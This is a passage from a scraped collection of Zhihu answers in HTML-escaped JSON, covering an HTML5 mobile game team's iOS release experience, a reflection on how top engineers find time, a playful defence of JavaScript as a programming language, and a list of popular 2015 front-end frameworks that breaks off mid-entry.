class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;g.duopao.com/apk/downlo&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ad?utm_source=ghzj_v1.2.1&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;2）用HTML5开发，游戏升级版本更新会更方便，只要不涉及原生代码的改动，我们都可以在后台安排脚本更新即可，无需用户再去下载安装覆盖等麻烦，也减少了因此而带来的用户流失。&lt;br&gt;&lt;br&gt;3）用HTML5开发的网页游戏跨平台的能力较强，可以运行在PC，平板，手机等所有支持HTML5的浏览器内，这样可以让玩家无论是在电脑还是手机都可以跨平台体验游戏的乐趣，从后台数据看，大部分用户是愿意接受在不同的时段使用不同设备，电脑和手机来体验我们的游戏。随时可以访问我们的网站：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//g.duopao.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;光辉战纪官网-多泡游戏&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/e60f0d407cf1e49490901aeec36c5eff_b.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;186&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/e60f0d407cf1e49490901aeec36c5eff_r.jpg&quot;&gt;&lt;br&gt;4）HTML5开发手机应用和游戏相对来讲会比较安全，由于浏览器的限制，我们是无法读取用户的隐私信息或设置暗扣陷阱。&lt;br&gt;&lt;br&gt;5）虽然HTML5页游有以上的好处，但目前HTML5游戏的市场环境还并不成熟，很多用户还是比较习惯安装app来玩游戏的习惯，所以我们也采用同时推安装包和链接两种方式来尽可能的覆盖我们的用户群，因此webapp的推广方式还是非常灵活的。&lt;br&gt;&lt;br&gt;我们作为一个HTML5页游的创业团队已经根植这项技术3年了，这期间我们从未对自己的方向有所怀疑，我们也欣喜的看到随着浏览器发展越来越成熟，我们的伙伴也越来越多，吾道不孤矣。我们也希望通过这篇小文，也带给跟我们一样在路上的伙伴们一些鼓励，一点帮助。加油！最后借此文感谢项目中一直努力奉献和付出的大牛光哥，跃强，雪冰，高妹，Cae还有小寒，何叶等等同学们，没有你们的百折不挠顽强努力，上线是不可能的！我爱你们~&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/9b69174bd9cf488f44df801cb679d01b_b.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;900&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/9b69174bd9cf488f44df801cb679d01b_r.jpg&quot;&gt;&lt;br&gt;目前这款游戏已经开始免费下载，如果大家觉得这篇小文对你们有所帮助的话，也请大家支持一下我们，轻点一下app下载，给留个好评，谢谢啦！&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;《猎魔佣兵》苹果商店地址：https://itunes.apple.com/cn/app/lie-mo-yong-bing./id605684016?ls=1&amp;amp;mt=8\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;或在AppStore搜索 “猎魔佣兵”&lt;br&gt;或用手机扫一扫：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/235131ee6cd77754378572730a0af15c_b.jpg&quot; data-rawwidth=&quot;260&quot; data-rawheight=&quot;260&quot; class=&quot;content_image&quot; width=&quot;260&quot;&gt;再次感谢大家百忙之中抽空阅读这篇小文！</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n<img src=\"https://pic1.zhimg.com/47dfb82453449ad785fabb8a96697e70_200x112.jpg\" data-rawwidth=\"600\" data-rawheight=\"450\" class=\"origin_image inline-img zh-lightbox-thumb\" data-original=\"https://pic1.zhimg.com/47dfb82453449ad785fabb8a96697e70_r.jpg\">\n很巧去年11月份我们开始决定进行HTML5手机页游《猎魔佣兵》的iOS版本打包工作。这也是我们首次进行iOS版本的封包，此前坊间有各种各样说法流传，苹果已经对WebApp加大了审核的严格程度，有一大批HTML5的游戏和应用纷纷都被斩于马下。带着这样忐忑不安的心情…\n\n<a href=\"/question/20880421/answer/16482368\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2013-03-24\" target=\"_blank\" href=\"/question/20880421/answer/16482368\">编辑于 2013-03-24</a></p>\n\n",
    "link": "https://zhihu.com/question/20880421/answer/16482368"
  },
  {
    "question": "\n为什么大牛们有那么多时间，做有影响力的事情?\n",
    "author": "玉伯",
    "content": "\n\n<textarea hidden class=\"content\">至少有两种大牛。&lt;br&gt;&lt;br&gt;一种是像李开复这种，疯狂燃烧生命，以睡觉少干活多为追求。当你在慢悠悠陪朋友吃饭时，他在吃泡面。当你在看「花千骨」时，他在写书。当你在百无聊赖不知干点什么好时，他在信心满满斗志昂扬…… 最后，当你还活着，他开始感慨为什么自己要濒临死亡。&lt;br&gt;&lt;br&gt;还有一种大牛，他们把工作当乐趣，而不是去应付。题主第一句话中的「应付工作」，就是题主与这些不应付工作大牛的最大区别。这类大牛，发现自己在应付工作时，会想为何自己还要待在这个公司？他们不会苦苦等待下班，而是会非常高效兴奋的把一天的工作迅速做完，然后就有时间写书、演讲、看书、出作品了。这些看似与工作无关的事情，在这些大牛心中，和工作也是息息相关的，否则就不会去做。君不见冯大辉的每一篇公众号文章里，都流露着对丁香园的爱吗？还有风趣雅致的卖桃君，你看的是他在写博客消遣时间，我看到的是池大哥在每个句点的追求里领悟锤子完美与工匠精神的精髓。&lt;br&gt;&lt;br&gt;世间有舍与得，真正舍去你不想的，就会有大把大把时间去做那些仅剩无存的几个想做的事情。若你依旧觉得时间不够，只在于你不愿舍弃太多。&lt;br&gt;&lt;br&gt;因此世间其实只有一种大牛。像李开复这类大牛，是舍弃了家庭与健康，也是一种个人选择，值得尊重但不值得追随。更多大牛不像李开复，这是他们身材好的原因。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n至少有两种大牛。 一种是像李开复这种，疯狂燃烧生命，以睡觉少干活多为追求。当你在慢悠悠陪朋友吃饭时，他在吃泡面。当你在看「花千骨」时，他在写书。当你在百无聊赖不知干点什么好时，他在信心满满斗志昂扬…… 最后，当你还活着，他开始感慨为什么自己…\n\n<a href=\"/question/32155319/answer/54859600\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2015-07-13\" target=\"_blank\" href=\"/question/32155319/answer/54859600\">编辑于 2015-07-13</a></p>\n\n",
    "link": "https://zhihu.com/question/32155319/answer/54859600"
  },
  {
    "question": "\nJavaScript算是严格意义上的编程语言吗？\n",
    "author": "itlr",
    "content": "\n\n<textarea hidden class=\"content\">JS当然不算是『严格意义』的编程语言&lt;br&gt;因为它除了if/else/for还var/for/in&lt;br&gt;不仅var还var x = function&lt;br&gt;它不class但object&lt;br&gt;它不仅new还.prototype&lt;br&gt;它不new不class照样{}&lt;br&gt;它不new ArrayList&amp;lt;String&amp;gt;但[]&lt;br&gt;它不doSth(&amp;amp;fnPtr)，但它doSth(fn)&lt;br&gt;它不* function但它lambda&lt;br&gt;它不static但closure&lt;br&gt;它不范型但它*.*&lt;br&gt;是的，它不gcc也不dbg，更不make，不过它debugger；它console.&lt;br&gt;它不QT,GTK，但DOM,html5/css3&lt;br&gt;它不boost但asm&lt;br&gt;它不STL但jQuery,_,Backbone&lt;br&gt;它不Thread但Promise&lt;br&gt;它是编程语言&lt;br&gt;只不过它没你要的『严格意义』&lt;br&gt;只不过我说的是『是』&lt;br&gt;而你要的是『算』&lt;br&gt;&lt;br&gt;&lt;p&gt;&lt;a href=&quot;//link.zhihu.com/?target=http%3A//www.amazon.cn/gp/product/193398869X/ref%3Das_li_ss_tl%3Fie%3DUTF8%26camp%3D536%26creative%3D3132%26creativeASIN%3D193398869X%26linkCode%3Das2%26tag%3Dzhihu02-23&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Secrets of the JavaScript Ninja&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\nJS当然不算是『严格意义』的编程语言 因为它除了if/else/for还var/for/in 不仅var还var x = function 它不class但object 它不仅new还.prototype 它不new不class照样{} 它不new ArrayList&lt;String&gt;但[] 它不doSth(&amp;fnPtr)，但它doSth(fn) 它不* function但它l…\n\n<a href=\"/question/23569951/answer/48780995\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2015-05-24\" target=\"_blank\" href=\"/question/23569951/answer/48780995\">编辑于 2015-12-26</a></p>\n\n",
    "link": "https://zhihu.com/question/23569951/answer/48780995"
  },
  {
    "question": "\n2015年有哪些比较优秀的前端框架？\n",
    "author": "匿名用户",
    "content": "\n\n<textarea hidden class=\"content\">&lt;p&gt;&lt;b&gt;2015&lt;/b&gt;&lt;b&gt;年已经过去了，作为一个前端开发者，我觉得有必要把过去一年帮助过我或朋友们的优秀开源前端框架做个盘点，希望这些项目能够越来越好，帮助到更多的前端开发者们。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;此榜单根据github&lt;/b&gt;&lt;b&gt;上star&lt;/b&gt;&lt;b&gt;数作为排名依据，一个人力量有限，如果收集有遗漏欢迎补充。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;1&lt;/b&gt;&lt;b&gt;、名称：Bootstrap&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者： Twitter&lt;/p&gt;&lt;p&gt;人气：在Github上有91007 stars&lt;/p&gt;&lt;p&gt;描述：主流框架中毋庸置疑的老大，Bootstrap 是基于 HTML、CSS、JavaScript 的，它简洁灵活，使得 Web 开发更加快捷。&lt;/p&gt;&lt;p&gt;核心概念/原则: RWD 和移动优先制。&lt;/p&gt;&lt;p&gt;浏览器支持： Firefox, Chrome, Safari, IE8+ (你需要 Respond.js for\nIE8)&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//getbootstrap.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Bootstrap · The world's most popular mobile-first and responsive front-end framework.&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/twbs/bootstrap&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;twbs/bootstrap · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;2&lt;/b&gt;&lt;b&gt;、名称：html5-boilerplate&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：Paul Irish&lt;/p&gt;&lt;p&gt;人气：在Github上有32,349 stars&lt;/p&gt;&lt;p&gt;描述：HTML5 Boilerplate 帮你构建\n快速, 健壮, 并且\n适应力强 的web app或网站。&lt;/p&gt;&lt;p&gt;核心概念/原则：响应式&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox, Chrome, Safari, IE8+,Edge,Opera&lt;/p&gt;&lt;p&gt;预处理器：None&lt;/p&gt;&lt;p&gt;响应式：Yes&lt;/p&gt;&lt;p&gt;模块化：Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//html5boilerplate.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;HTML5 Boilerplate: T&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/h5bp/html5-boilerplate&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;h5bp/html5-boilerplate · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;3&lt;/b&gt;&lt;b&gt;、名称：Meteor&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：immir&lt;/p&gt;&lt;p&gt;人气：在Github上有31,092 stars&lt;/p&gt;&lt;p&gt;描述：Meteor是新一代的开发即时web应用的开源框架，它能帮助你在最少的时间内完成开发。&lt;/p&gt;&lt;p&gt;核心概念/原则：响应式&lt;/p&gt;&lt;p&gt;预处理器: Less&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//www.meteor.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Meteor&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/meteor/meteor/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;meteor/meteor · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;4&lt;/b&gt;&lt;b&gt;、名称：Semantic UI &lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者: Jack Lukic&lt;/p&gt;&lt;p&gt;人气: 在Github上有22,325 stars&lt;/p&gt;&lt;p&gt;描述: “基于自然语言有效原则的UI组件框架”&lt;/p&gt;&lt;p&gt;核心概念/原则: 语义，标签的矛盾性、响应式&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox, Chrome, Safari, IE10+ (IE9 with browser prefix only),\nAndroid 4, Blackberry 10。&lt;/p&gt;&lt;p&gt;预处理器: Less&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//semantic-ui.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Semantic UI&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/Semantic-Org/Semantic-UI&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Semantic-Org/Semantic-UI · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;5&lt;/b&gt;&lt;b&gt;、名称：Foundation&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者: ZURB&lt;br&gt;人气: 在Github上有22,206+ stars&lt;br&gt;描述: “世界上最优秀的响应式前端框架”&lt;br&gt;核心概念/原则: RWD 、手机优先、语义的&lt;/p&gt;&lt;p&gt;浏览器支持： Chrome, Firefox, Safari, IE9+; iOS, Android, Windows Phone 7+&lt;br&gt;预处理器: Sass&lt;br&gt;响应式: Yes&lt;br&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//foundation.zurb.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Foundation | The most advanced responsive front-end framework in the world.&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/zurb/foundation-sites&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;zurb/foundation-sites · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;6&lt;/b&gt;&lt;b&gt;、名称：Materialize&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：CSS&lt;/p&gt;&lt;p&gt;创建者：Google&lt;/p&gt;&lt;p&gt;人气：在Github上有15,288stars&lt;/p&gt;&lt;p&gt;描述：Materialize是一个个基于材料设计的一个现代化的响应式前端框架。他们做了最繁重的工作，为您提供默认的样式，结合了您的自定义组件。此外，他们还改进动画和过渡，为开发人员提供流畅的体验。&lt;/p&gt;&lt;p&gt;核心概念/原则：响应式&lt;/p&gt;&lt;p&gt;预处理器：Sass&lt;/p&gt;&lt;p&gt;响应式：Yes&lt;/p&gt;&lt;p&gt;模块化：Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//materializecss.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Documentation&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/Dogfalo/materialize&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Dogfalo/materialize · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;浏览器支持：Chrome 35+, Firefox 31+, Safari 7+, IE 10+&lt;/p&gt;&lt;p&gt;&lt;b&gt;7&lt;/b&gt;&lt;b&gt;、名称：Pure&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：CSS&lt;/p&gt;&lt;p&gt;创建者: Yahoo&lt;/p&gt;&lt;p&gt;人气: 在Github上有13,161 stars&lt;/p&gt;&lt;p&gt;描述: “您可以在每一个web项目中使用的一组小的和响应式的CSS模块”&lt;/p&gt;&lt;p&gt;核心概念/原则:SMACSS,极简的.&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox的最新版本, Chrome, Safari; IE7+; iOS 6.x, 7.x; Android 4.x&lt;/p&gt;&lt;p&gt;预处理器: None&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;br&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//purecss.io/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;purecss.io/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/yahoo/pure&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;yahoo/pure · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;8&lt;/b&gt;&lt;b&gt;、名称：Vue&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：尤雨溪&lt;/p&gt;&lt;p&gt;人气：在Github上有12,214 stars&lt;/p&gt;&lt;p&gt;描述：Vue.js 是用于构建交互式的 Web 界面的库。它提供了 MVVM 数据绑定和一个可组合的组件系统，具有简单、灵活的 API。&lt;/p&gt;&lt;p&gt;核心概念/原则：响应式&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox, Chrome, Safari, IE9+，Android\n4.2+，iOS 7+&lt;/p&gt;&lt;p&gt;预处理器：None&lt;/p&gt;&lt;p&gt;响应式：Yes&lt;/p&gt;&lt;p&gt;模块化：Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//vuejs.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;vue.js&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/vuejs/vue&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;vuejs/vue · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;9&lt;/b&gt;&lt;b&gt;、名称：Skeleton&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：Dave Gamache&lt;/p&gt;&lt;p&gt;人气：在Github上有10,622stars&lt;/p&gt;&lt;p&gt;描述：Skeleton 是一个小的 JS 和 CSS 文件的集合,可帮你快速开发漂亮的网站,适合各种屏幕设备包括手机。Skeleton 基于 960 grid 开发。它是一个 UI 框架。&lt;/p&gt;&lt;p&gt;核心概念/原则：响应式&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox, Chrome, Safari, IE10+,Opera&lt;/p&gt;&lt;p&gt;预处理器：None&lt;/p&gt;&lt;p&gt;响应式：Yes&lt;/p&gt;&lt;p&gt;模块化：Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//www.getskeleton.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Skeleton: Responsive CSS Boilerplate&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/dhg/Skeleton&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;dhg/Skeleton · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;10.&lt;/b&gt;&lt;b&gt;名称： Amaze UI &lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：云适配&lt;/p&gt;&lt;p&gt;最后更新时间：2015年12月&lt;/p&gt;&lt;p&gt;人气：在Github上有6425 stars&lt;/p&gt;&lt;p&gt;描述：国内首个开源HTML5跨屏前端框架，中文排版支持更优、本土化组件丰富。&lt;/p&gt;&lt;p&gt;并在2015年11月推出基于\nReact.js 的专属移动端 Web 组件库Amaze UI touch。&lt;/p&gt;&lt;p&gt;核心概念/原则：组件化、移动优先、轻量级、高性能。&lt;/p&gt;&lt;p&gt;浏览器支持： Firefox, Chrome, Safari, IE8+&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//amazeui.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Amaze UI | 中国首个开源 HTML5 跨屏前端框架&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/amazeui/amazeui&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;amazeui/amazeui · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;11&lt;/b&gt;&lt;b&gt;、名称：UIkit &lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者: YOOtheme&lt;/p&gt;&lt;p&gt;人气: 在Github上有6,050+ stars&lt;/p&gt;&lt;p&gt;描述: “一个轻量级的和模块化的前端框架,用于快速开发和功能强大的web接口。”&lt;/p&gt;&lt;p&gt;核心概念/原则:RWD, 手机优先.&lt;/p&gt;&lt;p&gt;预处理器: Less, Sass&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//getuikit.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;UIkit&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/uikit/uikit&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;uikit/uikit · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;浏览器支持： Chrome, Firefox, Safari, IE9+&lt;/p&gt;&lt;p&gt;&lt;b&gt;12&lt;/b&gt;&lt;b&gt;、名称：Yui&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：Yahoo&lt;/p&gt;&lt;p&gt;人气：在Github上有3,200+ stars&lt;/p&gt;&lt;p&gt;描述：Yahoo! UI Library (YUI) 是一个开放源代码的 JavaScript 函数库，为了能建立一个高互动的网页，它采用了AJAX, DHTML 和 DOM 等程式码技术。它也包含了许多 CSS 资源。使用授权为 BSD许可证&lt;/p&gt;&lt;p&gt;核心概念/原则：响应式&lt;/p&gt;&lt;p&gt;预处理器: None&lt;/p&gt;&lt;p&gt;响应式：Yes&lt;/p&gt;&lt;p&gt;模块化：Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//yuilibrary.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;yuilibrary.com/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/yui/yui3&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;yui/yui3 · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox, Chrome, Safari, IE10+,Opera&lt;/p&gt;&lt;p&gt;&lt;b&gt;13.&lt;/b&gt;&lt;b&gt;名称：kissy&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言： JavaScript&lt;/p&gt;&lt;p&gt;创建者：淘宝前端&lt;/p&gt;&lt;p&gt;最后更新时间：2015年7月&lt;/p&gt;&lt;p&gt;人气：在Github上有2035 stars&lt;/p&gt;&lt;p&gt;描述：KISSY 是一款跨终端、模块化、高性能、使用简单的 JavaScript 框架。&lt;/p&gt;&lt;p&gt;框架大小: 37 KB&lt;/p&gt;&lt;p&gt;核心概念/原则: 模块化，跨终端，高扩展性&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//docs.kissyui.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;KISSY - A Powerful JavaScript Framework&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/kissyteam/kissy/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;kissyteam/kissy · GitHub&lt;i 